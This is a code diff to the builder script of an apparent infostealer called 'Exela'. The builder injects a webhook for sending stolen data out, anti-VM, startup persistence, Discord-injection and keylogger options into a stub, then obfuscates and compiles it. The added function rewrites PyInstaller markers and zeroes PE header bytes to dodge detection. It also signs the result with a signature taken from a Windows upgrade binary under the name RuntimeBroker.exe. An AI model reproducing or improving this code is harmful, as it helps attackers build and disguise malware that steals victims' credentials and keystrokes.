@@ -11,6 +11,26 @@ class Build:
         self.antivmorospusu = "true"
         self.inject_dc = "false"
         self.compileToExe()
+    def ChangeExeHeaders(self, path:str) -> None:
+        os.system("cls")
+        print("Removing Exe Headers")
+        time.sleep(1)
+        print("Removing Linker Information")
+        time.sleep(1)
+        with open(path, "rb") as file:
+            data = file.read()
+        data = data.replace(b"PyInstaller:", b"PyInstallem:")
+        data = data.replace(b"pyi-runtime-tmpdir", b"bye-runtime-tmpdir")
+        data = data.replace(b"pyi-windows-manifest-filename", b"bye-windows-manifest-filename")
+        start_index = data.find(b"$") + 1
+        end_index = data.find(b"PE\x00\x00", start_index) - 1
+        data = data[:start_index] + bytes([0] * (end_index - start_index))  + data[end_index:]
+        start_index = data.find(b"PE\x00\x00") + 8
+        end_index = start_index + 4
+        data = data[:start_index] + bytes([0] * (end_index - start_index))  + data[end_index:]
+        with open(path, "wb") as file:
+            file.write(data)
+            del data
     def compileToExe(self):
         try:
             self.moduleInstaller()
@@ -67,12 +87,13 @@ class Build:
             else:self.pyinstallerCommand += "Obfuscated.py"
             with open("Exela.py", "r", encoding="utf-8", errors="ignore") as f:
                 readedCode = f.read()
-            replacedCode = readedCode.replace("%REPLACE_ME_FOR_QUiCADXD%", getWebhook[::-1]).replace('%AnTiVm%', self.antivmorospusu).replace("%StartuP%", self.startup).replace("%MethoD%", self.startupMethod).replace("%Inject_discord%", self.inject_dc).replace('%keyloggerinject???%', self.injectKeylogger)
+            replacedCode = readedCode.replace("%REPLACE_ME_FOR_QUiCADXD%", getWebhook).replace('%AnTiVm%', self.antivmorospusu).replace("%StartuP%", self.startup).replace("%MethoD%", self.startupMethod).replace("%Inject_discord%", self.inject_dc).replace('%keyloggerinject???%', self.injectKeylogger)
             with open("stub.py", "w", encoding="utf-8", errors="ignore") as x:
                 x.write(replacedCode)
             self.obfuscateFile()
             time.sleep(1)
             os.system(self.pyinstallerCommand)
+            self.ChangeExeHeaders("dist\\Obfuscated.exe")
         except Exception as e:
             os.system('cls')
             print("An error occurred while compiling your file\nplease contact the coder or check your python version : ", str(e))
@@ -83,7 +104,6 @@ class Build:
             print("Your File compiled was succesfully")
             time.sleep(1)
             self.singFile(os.getcwd() + "\\Signed\\Windows10Upgrade9252.exe", os.getcwd() + "\\dist\\Obfuscated.exe", "RuntimeBroker.exe")
-     
     def obfuscateFile(self):
         os.system("cls")
         print("Obfuscating file pls wait")
